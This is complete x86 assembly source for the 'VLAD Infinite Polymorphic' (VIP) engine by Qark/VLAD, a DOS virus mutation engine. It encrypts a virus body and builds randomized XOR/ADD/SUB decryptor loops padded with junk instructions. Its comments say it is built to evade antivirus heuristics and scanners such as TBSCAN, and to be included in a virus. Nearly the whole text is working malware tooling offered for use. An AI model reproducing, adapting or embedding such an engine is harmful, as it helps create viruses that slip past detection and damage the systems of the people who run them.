
;
;               VLAD Infinite Polymorphic - VIP
;               by Qark - VLAD
;
; This engine is good in some respects, and poor in others.
; The encryption it creates is fairly easy to crack, being a looping
; xor with a keychange (all registers/values chosen at random),
; but the encryption loops are very hard to detect.  There are four
; different loop types, of which TBSCAN can only find two.
;
; At the start of the decryptor, the engine won't produce some instructions
; that flag heuristics.  For this reason, VIP avoids alot of the heuristic
; problems most other garbage generators have.  For example:
;  Doesn't produce INC/DEC in the first 20 bytes to avoid flags.
;  Doesn't produce memory operations in the first 10 bytes.
;  Doesn't produce XCHG in the first 10 bytes.
;  Always uses the short version of instructions (AX/AL Imm etc)
;
; One problem that couldn't be avoided is the creation of FFFF word pointers
; causing crashes.  The likelihood of them occurring is low (about 1 in 300
; samples) because danger instructions have been put to a minimum. 
; (eg mov ax,[bx-1] bx=0, isn't produced anymore).
;
; If you're wondering why the polymorphism produced isn't changing, that's
; because it's an example of slow polymorphism.
;
; To assemble, use it as an include file for the program that calls it.
;


VIP:
;On entry:
;       AL    = 1 if COM file
;       DS:SI = Points to the unencrypted virus
;       ES:DI = Place to store encrypted virus
;       CX    = length of virus
;       BP    = delta offset
;    Assumes CS=DS=ES
;On return:
;       CX    = length of decryptor + encrypted code

        cld
        mov     word ptr saved_cx,cx
        mov     word ptr saved_di,di
        mov     word ptr saved_si,si
        mov     byte ptr segtype,al
        mov     byte ptr inloop,0               ;Initialise variable

        ;Initialise our randomisation for slow polymorphism.
        call    init_rand

        ;Clear the register table

        call    unmark_all

        ;Clear the displacements
        call    clear_displacement

        ;Select a random decryption type.
rand_routine:
        call    get_rand
        mov     si,offset dec_type
        and     ax,3*2
        add     si,ax
        mov     ax,word ptr [si]
        jmp     ax

Standard:
;Uses 'standard' encryption.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       xor     word ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+virlength
;       jne     loop
;     virus_start:
; -----------------------------------------------

        call    startup                 ;Setup pointer and cipher

        mov     byte ptr inloop,1
        mov     word ptr loopstart,di

        call    encrypt_type

        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne              ;JNE xx
        call    calc_jne

        mov     byte ptr inloop,0

        ;Calculate the displacement
        call    fix_displacements

        call    encrypt_virus

        call    decryptor_size

        ret

Stack1:
;Use the stack method for encryption.  This method doesnt work on EXE's
;because SS <> CS.
; ----This is a basic layout of the decryptor----
;       mov     sp,offset virus_start
;       mov     cipher,xor_val
;     loop:
;       pop     reg
;       xor     reg,cipher
;       push    reg
;       pop     randomreg
;       cmp     sp,virus_start+virus_length
;       jne     loop
; -----------------------------------------------

        cmp     byte ptr segtype,0
        jne     stack1_ok
        jmp     rand_routine
stack1_ok:
        call    rand_garbage
        call    rand_garbage
        mov     al,0bch         ;MOV SP,xxxx
        stosb
        mov     word ptr displace,di
        mov     ax,bp
        stosw

        call    setup_cipher
        
        mov     byte ptr inloop,1
        mov     word ptr loopstart,di

        call    select_reg
        call    rand_garbage
        push    ax
        or      al,58h                  ;POP reg
        stosb
        call    rand_garbage

        mov     al,33h                  ;XOR reg,reg
        stosb

        pop     ax
        push    ax
        push    cx
        mov     cl,3
        shl     al,3
        or      al,byte ptr cipher
        or      al,0c0h
        stosb
        pop     cx

        call    rand_garbage
        
        pop     ax
        or      al,50h          ;PUSH reg
        stosb

        call    rand_garbage
next_pop:
        call    get_rand
        call    check_reg
        jc      next_pop
        and     al,7
        or      al,58h          ;POP reg  (=add sp,2)
        stosb
        
        call    rand_garbage

        mov     ax,0fc81h               ;CMP SP,xxxx
        stosw
        mov     word ptr displace2,di
        
        call    round_up
        add     ax,bp
        stosw

        call    handle_jne
        call    calc_jne

        mov     byte ptr inloop,0

        mov     al,0bch         ;mov sp,0fffeh
        stosb
        mov     ax,0fffeh
        stosw

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements

        mov     si,word ptr saved_si
        mov     cx,word ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,word ptr xorval
enc_stack1:
        lodsw
        xor     ax,bx
        stosw
        loop    enc_stack1

        call    decryptor_size

        ret

Call_Enc:
;Uses recursive calls to decrypt the virus.  Needs a big stack or else it will
;crash.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       cmp     pointer,virus_start+virus_length
;       jne     small_dec
;       ret
;     small_dec:
;       xor     word ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       call    loop
;       add     sp,virus_length-2
; -----------------------------------------------

        call    startup
        
        mov     byte ptr inloop,1

        mov     word ptr loopback,di
        call    rand_garbage

        mov     al,byte ptr pointer
        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw
        
        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne

        mov     word ptr loopf,di
        stosb

        call    rand_garbage

        mov     al,0c3h                 ;RET
        stosb
        
        call    rand_garbage

        mov     ax,di                   ;Fix the JNE.
        mov     si,word ptr loopf
        inc     si
        sub     ax,si
        dec     si
        mov     byte ptr [si],al
        
        call    encrypt_type

        mov     al,0e8h                 ;CALL xxxx
        stosb
        mov     ax,di
        inc     ax
        inc     ax
        sub     ax,word ptr loopback
        neg     ax
        stosw

        mov     byte ptr inloop,0

        call    rand_garbage

        mov     ax,0c481h
        stosw
        mov     ax,word ptr saved_cx
        dec     ax
        dec     ax
        stosw

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        
        call    encrypt_virus
        
        call    decryptor_size

        ret

Call_Enc2:
;Decrypts the virus from within a call.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;       call    decrypt
;       jmp     short virus_start
;     decrypt:
;       xor     pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+viruslength
;       jne     decrypt
;       ret
; -----------------------------------------------

        call    startup

        mov     byte ptr inloop,1

        mov     al,0e8h                 ;CALL xxxx
        stosb
        stosw
        mov     word ptr loopf16,di
        
        call    rand_garbage

        mov     al,0e9h                 ;JMP xxxx
        stosb
        mov     word ptr displace2,di
;        mov     ax,di
;        inc     ax
;        inc     ax
;        sub     ax,saved_di
;        neg     ax
        stosw

        call    rand_garbage
        call    rand_garbage

        mov     ax,di
        mov     si,word ptr loopf16
        sub     ax,si
        mov     word ptr [si-2],ax

        mov     word ptr loopstart,di

        call    encrypt_type
        
        or      al,0f8h
        mov     ah,al
        mov     al,81h          ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne
        call    calc_jne

        mov     al,0c3h                 ;ret
        stosb

        mov     byte ptr inloop,0

        call    rand_garbage

        mov     ax,di
        mov     si,word ptr displace2
        sub     ax,si
        dec     ax
        dec     ax
        mov     [si],ax
        mov     word ptr displace2,0

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        
        call    encrypt_virus
        
        call    decryptor_size

        ret

        db      'VIP V1.0 by Qark/VLAD'


;All the different encryption types
dec_type        dw      offset stack1
                dw      offset call_enc
                dw      offset call_enc2
                dw      offset standard

segtype         db      0       ;1 if com file
saved_cx        dw      0       ;the initial CX
saved_di        dw      0       ;the initial DI
saved_si        dw      0

displace        dw      0
displace2       dw      0
                dw      0

displaceb       dw      0

inloop          db      0       ;=1 if inside a loop else 0
                                ;if set no 'word ptr' instructions made
loopstart       dw      0       ;for backwards 8 bit
loopf           dw      0       ;for forwards 8 bit
loopback        dw      0       ;backwards 16 bit
loopf16         dw      0       ;forwards 16 bit
xorval          dw      0

cipher          db      0

r_m             db      0       ;The r-m of the pointer

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;General routines, used universally
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
Check_Reg:
;Returns a carry if the register in lower 3 bits of al is bad
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        cmp     byte ptr [si],0
        pop     si
        pop     ax
        je      ok_reg
        stc
        ret
ok_reg:
        clc
        ret
        ;       ax,cx,dx,bx,sp,bp,si,di
reg     db      00,00,00,00,01,00,00,00

Mark_Reg:
;Mark a register as used, AL=reg
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        mov     byte ptr [si],1
        pop     si
        pop     ax
        ret

UnMark_All:
;Clears the register table, and sets SP
        push    ax
        push    di
        push    cx
        mov     di,offset reg
        mov     al,0
        mov     cx,8
        cs:
        rep     stosb
        mov     byte ptr cs:[reg+4],1      ;set sp
        pop     cx
        pop     di
        pop     ax
        ret

Clear_Displacement:
;Clears all the displacement variables
        push    di
        push    ax
        mov     di,offset displace
        xor     ax,ax
        stosw
        stosw
        stosw
        stosw
        stosw
        pop     ax
        pop     di
        ret

Select_Pointer:
;Select an r-m as a pointer, you must call this routine before reserving
;any registers.  Updates the variable r_m.
        push    ax
        push    si
        call    get_rand
        and     ax,7
        mov     byte ptr r_m,al

        call    index_2_pointer
        mov     al,byte ptr [si]
        call    mark_reg
        inc     si
        mov     al,byte ptr [si]
        cmp     al,0
        je      no_pointer2
        call    mark_reg
no_pointer2:
        pop     si
        pop     ax
        ret

Setup_Pointer:
;Sets up the registers specified in the r-m with random values.  These
;values are put into the variable 'pointval'.
;Moves the instructions into ES:DI.
        push    ax
        push    si

        call    rand_garbage

        call    index_2_pointer
        mov     al,byte ptr [si]
        mov     byte ptr pointer,al
        or      al,0b8h                 ;MOV REG,xxxx
        stosb
        call    get_rand
        stosw
        mov     word ptr pointval,ax
        mov     word ptr pointer1val,ax

        call    rand_garbage

        mov     al,byte ptr [si+1]
        cmp     al,0
        je      no_setupp2

        or      al,0b8h                 ;MOV REG,xxxx
        stosb

        call    get_rand
        stosw
        add     word ptr pointval,ax

        call    rand_garbage

no_setupp2:

        pop     si
        pop     ax
        ret

Index_2_Pointer:
;Sets SI to the 'pointers' table of the r_m
        push    ax
        xor     ax,ax
        mov     al,byte ptr r_m
        shl     ax,1
        mov     si,offset pointers
        add     si,ax
        pop     ax
        ret

pointer         db      0               ;the first register
pointer1val     dw      0               ;the value of the first register
pointval        dw      0
Pointers        db      3,6     ;[bx+si]
                db      3,7     ;[bx+di]
                db      5,6     ;[bp+si]
                db      5,7     ;[bp+di]
                db      6,0     ;[si]
                db      7,0     ;[di]
                db      5,0     ;[bp]
                db      3,0     ;[bx]

Select_Reg:
;Reserves a random register, and passes it out in AL
;AH is destroyed
        call    get_rand
        call    check_reg
        jc      select_reg
        and     al,7
        call    mark_reg
        ret

Setup_Reg:
;Puts the value specified in BX, into the register specified in AL.
;-Needs Fixing- to add a possible SUB, and also the garbage generation needs
;to produce the same add/sub opcodes.

        push    ax
        push    bx

        call    rand_garbage

        and     al,7
        push    ax
        or      al,0b8h         ;MOV reg,xxxx
        stosb
        
        call    get_rand

        sub     bx,ax
        stosw

        call    rand_garbage

        pop     ax
        cmp     al,0
        jne     long_addreg
        mov     al,5            ;ADD AX,xxxx
        stosb
        jmp     short finish_add
long_addreg:
        or      al,0c0h
        mov     ah,al
        mov     al,81h
        stosw                   ;ADD reg,xxxx
finish_add:
        mov     ax,bx
        stosw
        
        call    rand_garbage

        pop     bx
        pop     ax
        ret

Seg_Override:
;Puts the correct segment before a memory write.  The memory write must be
;called immediately afterwards.
        push    ax
        cmp     byte ptr segtype,1
        je      no_segset
        mov     al,2eh          ;CS:
        stosb
no_segset:
        pop     ax
        ret

Fix_Pointer:
;Fixes up the mod/rm field of a pointer instruction.  Before this routine
;is called, the opcode field has already been stosb'd. eg for xor, 31h has
;been put into the current es:[di-1].
;on entry AL=register
;The displacement field (the following 2 bytes) must be fixed up manually.

        push    ax
        push    bx
        push    cx

        mov     cl,3
        shl     al,cl
        or      al,byte ptr r_m
        or      al,80h
        stosb

        pop     cx
        pop     bx
        pop     ax
        ret

Dec_Inc_Reg:
;Inc/Dec's the reg in AL. AH= 0=inc 1=dec
;No garbage generators are called in this routine, because the flags
;may be important.
        push    ax
        mov     byte ptr dec_inc,ah
        call    get_rand
        test    al,1
        pop     ax
        push    ax
        jnz     do_inc_dec
        cmp     al,0            ;check for ax
        jne     not_ax_incdec
        mov     ax,0ff05h       ;ADD AX,ffff  = DEC AX
        cmp     byte ptr dec_inc,0
        jne     fdec1
        mov     al,2dh          ;SUB
fdec1:
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        ret
not_ax_incdec:
        cmp     byte ptr dec_inc,0
        je      fdec2
        or      al,0c0h
        jmp     short fdec3
fdec2:
        or      al,0e8h
fdec3:
        mov     ah,al
        mov     al,83h          ;ADD reg,ffff = DEC reg
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        ret
do_inc_dec:
        or      al,40h          ;INC reg
        cmp     byte ptr dec_inc,0
        je      fdec4
        or      al,8
fdec4:
        stosb
        pop     ax
        ret
dec_inc db      0               ;0=inc 1=dec

Round_Up:
;Rounds up the number in saved_cx to the nearest 2 and passes it out in AX.
        mov     ax,word ptr saved_cx
        inc     ax
        shr     ax,1
        shl     ax,1
        mov     word ptr saved_cx,ax
        ret

Fix_Displacements:
;Adds the size of the produced decyptors to the data listed in the
;displacement variables. 0 Values signal the end.
;DI=The final length of the 'decryptor'

        push    ax
        push    si
        
        mov     ax,di
        sub     ax,word ptr saved_di
        push    di
        mov     si,offset displace
disp_loop:
        cmp     word ptr [si],0
        je      last_displacement
        mov     di,[si]
        add     [di],ax
        inc     si
        inc     si
        jmp     short disp_loop
last_displacement:
        pop     di
        pop     si
        pop     ax
        ret

Rand_Garbage:
;Generates 1-4 garbage instructions.
        push    ax
        call    get_rand
        and     ax,07h
        push    cx
        mov     cx,ax
        inc     cx
start_garbage:
        call    select_garbage
        loop    start_garbage
        pop     cx
        pop     ax
        ret

Select_Garbage:
;Selects a garbage routine to goto
        
        call    get_rand
        and     ax,14
        push    si
        mov     si,offset calls
        add     si,ax
        mov     ax,word ptr [si]
        pop     si
        jmp     ax

calls   dw      offset Make_Inc_Dec
        dw      offset Imm2Reg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Make_Xchg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Imm2Reg

Make_Inc_Dec:
;Puts a word INC/DEC in ES:DI
;eg INC  AX
;   DEC  BP

        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,15
        ja      not_poly_start          ;inc/dec in the first 20 bytes, flags
        ret
not_poly_start:
        call    get_rand
        call    check_reg
        jc      make_inc_dec
        and     al,0fh
        or      al,40h
        
        test    al,8
        jnz     calc_dec

        stosb
        ret
calc_dec:
        mov     ah,al
        and     al,7
        cmp     al,2
        ja      Make_Inc_Dec
        mov     al,ah
        stosb
        ret

Fix_Register:
;AX=random byte, where the expected outcome is ah=opcode al=mod/rm
;Carry is set if bad register.  Word_Byte is updated to show word/byte.
        test    ah,1
        jnz     word_garbage
        mov     byte ptr word_byte,0
        call    check_breg
        jmp     short byte_garbage
word_garbage:
        mov     byte ptr word_byte,1
        call    check_reg
byte_garbage:
        ret        
word_byte       db      0       ;1=word, 0 = byte


Imm2Reg:
;Immediate to register.
        call    get_rand
        call    fix_register
        jc      imm2reg
        test    al,7            ;AX/AL arent allowed (causes heuristics)
        jz      imm2ax
        xchg    al,ah
        and     al,3
        cmp     al,2            ;signed byte is bad
        je      imm2reg
        or      al,80h
        or      ah,0c0h
        stosw
        test    al,2            ;signed word
        jnz     ione_stosb
        call    get_rand
        cmp     byte ptr word_byte,1
        jne     ione_stosb
        stosb
ione_stosb:
        call    get_rand
        stosb
        ret
imm2ax:
        xchg    ah,al
        and     al,3dh
        or      al,4
        stosw
        test    al,1
        jnz     ione_stosb
        ret

Rand_Instr:
;Creates a whole stack of instructions.
;and,or,xor,add,sub,adc,cmp,sbb

        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,10
        ja      not_poly_start2         ;in the first 20 bytes, flags G
        ret
not_poly_start2:
        call    get_rand
        ;Inloop stops xxx xx,word ptr [xxxx] instructions inside the
        ;loops.  It changes them to 'byte ptr' which stops the ffff crash
        ;problem.
        cmp     byte ptr inloop,1
        jne     ok_words
        and     ah,0feh
ok_words:
        call    fix_register
        jc      rand_instr
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        xchg    ah,al
        and     al,039h
        or      al,2            ;set direction flag
        stosb
        mov     al,ah
        and     al,0c0h
        cmp     al,0c0h
        je      zerobytedisp
        cmp     al,0
        je      checkdisp
        cmp     al,80h
        je      twobytedisp
        ;sign extended
        mov     al,ah
        stosb
negative_value:
        call    get_rand
        cmp     al,0ffh
        je      negative_value
        stosb
        ret
twobytedisp:
        mov     al,ah
        stosb
        call    get_rand
        stosw
        ret
checkdisp:
        push    ax
        and     ah,7
        cmp     ah,6
        pop     ax
        je      twobytedisp
zerobytedisp:
        mov     al,ah
        stosb
        ret

Mov_Imm:
;Puts a MOV immediate instruction.
        call    get_rand
        test    al,8
        jnz     word_mov
        call    check_breg
        jmp     short mov_check
word_mov:
        call    check_reg
mov_check:
        jc      mov_imm
        and     al,0fh
        or      al,0b0h
        stosb
        test    al,8
        jnz     mov_word
        call    get_rand
        stosb
        ret
mov_word:
        call    get_rand
        stosw
        ret

Init_Rand:
;Initialises the Get_Rand procedure.
        push    ax
        push    cx
        push    dx
        push    si
        push    ds
        mov     si,1
        mov     ax,0ffffh               ;Get word from ROM BIOS.
        mov     ds,ax
        mov     ax,word ptr [si]
        pop     ds
        mov     word ptr randseed,ax
        call    get_rand
        push    ax
        mov     ah,2ah                  ;Get Date.
        int 21h ;call   int21h
        pop     ax
        add     ax,cx
        xor     ax,dx
        mov     word ptr randseed,ax
        call    get_rand
        pop     si
        pop     dx
        pop     cx
        pop     ax
        ret

Get_Rand:
;Gets a random number in AX.
        push    cx
        push    dx
        mov     ax,word ptr randseed
        mov     cx,ax
        mov     dx,ax
        and     cx,1ffh
        or      cl,01fh
propogate:
        add     dx,ax
        mul     dx
        add     ax,4321h
        neg     ax
        ror     dx,1
        loop    propogate
        mov     word ptr randseed,ax
        
        pop     dx
        pop     cx
        ret
randseed        dw      0

Make_Xchg:
        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,10
        ja      not_poly_start3         ;inc/dec in the first 20 bytes, flags
        ret
not_poly_start3:

        call    get_rand
        call    fix_register
        jc      make_xchg
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        call    fix_register
        jc      make_xchg
        test    ah,1
        jz      xchg_8bit
        test    al,7
        jz      xchg_ax2
        test    al,38h
        jz      xchg_ax1
xchg_8bit:
        and     ax,13fh
        or      ax,86c0h
        xchg    ah,al
        stosw
        ret
xchg_ax1:
        and     al,7
        or      al,90h
        stosb
        ret
xchg_ax2:
        push    cx
        mov     cl,3
        ror     al,cl
        pop     cx
        jmp     short xchg_ax1

Check_bReg:
;Checks if an 8bit reg is used or not.
;AL=register
        push    ax
        and     al,3
        call    check_reg
        pop     ax
        ret

Decryptor_Size:
;Calculate the size of the decryptor + code
;Entry: DI=everything done
;Exit : CX=total decryptor length

        mov     cx,di
        sub     cx,word ptr saved_di
        ret

Setup_Cipher:
;Randomly selects a cipher register and initialises it with a value.
;Puts the register into the variable 'cipher' and the value into 'xorval'

        call    rand_garbage
        call    get_rand
        mov     bx,ax
        mov     word ptr xorval,ax
        call    select_reg
        mov     byte ptr cipher,al
        call    setup_reg
        call    rand_garbage
        ret

Startup:
;Does the most common startup procedures.  Puts some garbage, and sets
;up the pointer register.

        call    rand_garbage
        call    rand_garbage
        call    select_pointer          ;Setup pointer
        call    setup_pointer

        call    setup_cipher
        ret

Handle_JNE:
;Randomly puts either JNE or JB at ES:DI.
;Must be called after the CMP instruction.
        push    ax
        push    si

        ;Test to make sure our pointer isnt going +ffff, if so, only use
        ;jne, not jnb.
        call    round_up
        add     ax,word ptr pointer1val
        jnc     random_jne
        mov     al,75h
        jmp     short unrandom_jne
random_jne:

        call    get_rand
        and     ax,1
        mov     si,offset jne_table
        add     si,ax
        mov     al,byte ptr [si]
unrandom_jne:
        stosb
        pop     si
        pop     ax
        ret

jne_table       db      75h     ;JNE/JNZ
                db      72h     ;JB/JNAE

Calc_JNE:
;Calculates the distance needed to JMP backwards and puts it into ES:DI.
;On entry DI points to the byte after a JNE/JB instruction
;         and 'loopstart' contains the offset of the loop.

        push    ax
        mov     ax,di
        inc     ax
        sub     ax,word ptr loopstart
        neg     al
        stosb
        call    rand_garbage
        pop     ax
        ret

Increase_Pointer:
;Increases the register specified in 'pointer' by two.
;On exit AL=pointer register.

        call    rand_garbage
        xor     ax,ax
        mov     al,byte ptr pointer
        call    dec_inc_reg
        call    rand_garbage
        call    dec_inc_reg
        call    rand_garbage
        ret

Encrypt_Type:
;Selects the type of encryption and sets everything up.
        call    rand_garbage
        call    seg_override

        call    rand3
        mov     al,byte ptr [si+1]
        mov     byte ptr encbyte,al

        mov     al,byte ptr [si]        ;The instruction from 'enc_table'
        stosb

        mov     al,byte ptr cipher
        call    fix_pointer
        mov     word ptr displace,di
        
        mov     ax,bp
        sub     ax,word ptr pointval
        stosw

        call    rand_garbage
        
        call    rand3
        mov     al,byte ptr [si+2]
        or      al,0c3h
        mov     byte ptr encb2,al
        
        cmp     byte ptr cipher,0
        jne     fix_16imm
        mov     al,byte ptr [si+2]
        or      al,5
        stosb
        jmp     short set_imm

fix_16imm:
        mov     al,81h
        stosb
        mov     al,byte ptr [si+2]
        or      al,0c0h
        or      al,byte ptr cipher
        stosb

set_imm:
        call    get_rand
        stosw

        mov     word ptr encval2,ax

        call    increase_pointer

        ret

enc_table       db      31h     ;XOR            ;Direct word operation
                db      33h     ;XOR reg,reg    ;Undo..
                db      30h

                db      01h     ;ADD
                db      2bh     ;SUB reg,reg
                db      0       ;ADD

                db      29h     ;SUB
                db      03h     ;ADD reg,reg
                db      28h

Rand3:
;Gets a number in ax, either 0,4,8, and indexes SI that distance into
;enc_table.
encrypt_rand:
        call    get_rand
        mov     cx,3
        xor     dx,dx
        div     cx
        mov     ax,dx
        xor     dx,dx
        mul     cx
        mov     si,offset enc_table
        add     si,ax
        ret

Encrypt_Virus:
        mov     si,word ptr saved_si
        mov     cx,word ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,word ptr xorval
enc_loop:
        lodsw

        ;op ax,bx
        encbyte db      0       ;op
                db      0c3h

                db      81h
        encb2   db      0
        encval2 dw      0

        stosw
        loop    enc_loop
        ret

